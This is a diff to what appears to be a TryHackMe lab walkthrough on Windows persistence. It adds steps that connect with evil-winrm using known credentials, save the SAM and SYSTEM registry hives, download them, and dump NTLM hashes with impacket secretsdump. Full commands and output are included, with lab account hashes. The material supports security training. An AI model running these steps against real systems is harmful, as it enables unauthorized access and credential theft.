@@ -26,6 +26,100 @@ HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
 C:\>reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
 The operation completed successfully.
 ```
+7. `evil-winrm -i {TARGET IP} -u thmuser1 -p Password321` from our Linux attack machine to remotely connect to the compromised machine as our target user (thmuser1) using WinRM
+```Bash
+root@ip-10-10-72-227:~# evil-winrm -i 10.10.41.253 -u thmuser1 -p Password321
+
+Evil-WinRM shell v2.4
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\thmuser1\Documents> 
+```
+8. `whoami /groups`
+```bash
+*Evil-WinRM* PS C:\Users\thmuser1\Documents> whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                           Type             SID          Attributes
+==================================== ================ ============ ==================================================
+Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Backup Operators             Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users      Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level Label            S-1-16-12288
+```
+9. `cd \`
+```Bash
+*Evil-WinRM* PS C:\Users\thmuser1\Documents> cd \
+```
+10. `reg save hklm\system {FILENAME1}.bak`
+```Bash
+*Evil-WinRM* PS C:\> reg save hklm\system SYSTEM.bak
+The operation completed successfully.
+
+```
+11. `reg save hklm\sam {FILENAME2}.bak`
+```Bash
+*Evil-WinRM* PS C:\> reg save hklm\sam SAM.bak
+The operation completed successfully.
+
+```
+12. `download {FILENAME1}.bak`
+```Bash
+*Evil-WinRM* PS C:\> download SYSTEM.bak
+Info: Downloading C:\\SYSTEM.bak to SYSTEM.bak
+
+                                                             
+Info: Download successful!
+```
+13. `download {FILENAME2}.bak` 
+```Bash
+*Evil-WinRM* PS C:\> download SAM.bak
+Info: Downloading C:\\SAM.bak to SAM.bak
+
+                                                             
+Info: Download successful!
+```
+14. `exit`
+```Bash
+*Evil-WinRM* PS C:\> exit
+
+Info: Exiting with code 0
+
+root@ip-10-10-72-227:~# 
+```
+15. `ls`
+```Bash
+root@ip-10-10-72-227:~# ls
+Desktop    Instructions  Postman  SAM.bak  SYSTEM.bak         Tools
+Downloads  Pictures      Rooms    Scripts  thinclient_drives  work
+```
+16. `python3.9 /opt/impacket/examples/secretsdump.py -sam {FILENAME2}.bak -system {FILENAME1}.bak LOCAL`
+```Bash
+root@ip-10-10-72-227:~# python3.9 /opt/impacket/examples/secretsdump.py -sam SAM.bak -system SYSTEM.bak LOCAL 
+Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
+
+[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
+thmuser1:1008:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
+thmuser2:1009:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
+thmuser3:1010:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
+thmuser0:1011:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
+thmuser4:1013:aad3b435b51404eeaad3b435b51404ee:8767940d669d0eb618c15c11952472e5:::
+[*] Cleaning up... 
+```
 
 # Assigning Specific Privileges Using Security Descriptors
 
